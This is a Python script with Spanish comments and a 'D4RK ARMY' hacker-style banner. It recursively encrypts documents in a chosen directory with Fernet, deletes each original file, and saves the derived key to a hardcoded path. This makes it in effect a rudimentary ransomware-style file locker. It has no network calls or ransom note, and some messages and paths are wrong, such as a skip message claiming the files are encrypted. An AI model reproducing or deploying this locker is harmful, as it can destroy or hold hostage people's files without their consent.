import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import base64

def generate_key(password):
    # Derive a 32-byte key from the password using PBKDF2 with SHA-256
    salt = b'\x93\xd0\xbf\xdbG7Bp\xb5(\xad\xe2oQ\xba'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    encoded_key = base64.urlsafe_b64encode(key)
    return encoded_key

def encrypt_file(file_path, key):
    try:
        # Verifica si el archivo existe y es un archivo válido
        if not os.path.isfile(file_path):
            print(f"El archivo '{file_path}' no existe o no es un archivo válido.")
            return

        # Obtiene la extensión del archivo
        file_name, file_extension = os.path.splitext(file_path)

        # Verifica si el archivo tiene una extensión válida para encriptación
        valid_extensions = ['.txt', '.docx', '.xlsx', '.pdf'] # Agrega las extensiones válidas aquí
        if file_extension.lower() not in valid_extensions:
            print(f"El archivo '{file_path}' files are encrypted.")
            return

        # Lee el contenido del archivo
        with open(file_path, 'rb') as file:
            content = file.read()

        # Encripta el contenido del archivo
        fernet = Fernet(key)
        encrypted_content = fernet.encrypt(content)

        # Crea la ruta del archivo encriptado
        encrypted_file_path = file_name + '.enc'

        # Crea los subdirectorios necesarios en el directorio encriptado
        encrypted_file_dir = os.path.dirname(encrypted_file_path)
        os.makedirs(encrypted_file_dir, exist_ok=True)

        # Escribe el contenido encriptado en el nuevo archivo
        with open(encrypted_file_path, 'wb') as file:
            file.write(encrypted_content)

        # Elimina el archivo original
        os.remove(file_path)

    except Exception as e:
        print(f"Error al encriptar el archivo '{file_path}': {str(e)}")

def encrypt_directory(directory_path, key):
    try:
        # Verifica si el directorio existe
        if not os.path.isdir(directory_path):
            print(f"El directorio '{directory_path}' no existe o no es un directorio válido.")
            return

        # Recorre todos los archivos en el directorio (y subdirectorios)
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

    except Exception as e:
        print(f"Error al encriptar el directorio '{directory_path}': {str(e)}")

def main():
    try:
        # Imprime el banner en color rojo
        print("\033[31m")
        print("****************************************")
        print("*            D4RK ARMY                 *")
        print("*                                      *")
        print("*          Encrypt files               *")
        print("*                                      *")
        print("*       Powered by cisco_101           *")
        print("*                                      *")
        print("****************************************")
        print("\033[0m")

        # Obtiene la ruta absoluta del directorio a encriptar
        directory_path = os.path.abspath(input("Ingrese la ruta del directorio a encriptar: "))

        # Solicitar la clave de encriptación al usuario
        encryption_key = input("Ingrese la clave de encriptación: ")

        # Genera una clave a partir de la clave ingresada
        key = generate_key(encryption_key)

        # Encripta el directorio
        encrypt_directory(directory_path, key)

        print("¡Directorio encriptado con éxito!")

        # Guarda la clave generada en un archivo en la ruta especificada
        key_file_path = r"C:\-\-\-\encryption_key.txt"
        with open(key_file_path, "wb") as key_file:
            key_file.write(key)

        print(f"Clave generada guardada en el archivo: {key_file_path}")

    except Exception as e:
        print(f"Error al ejecutar el programa: {str(e)}")


if __name__ == "__main__":
    main()




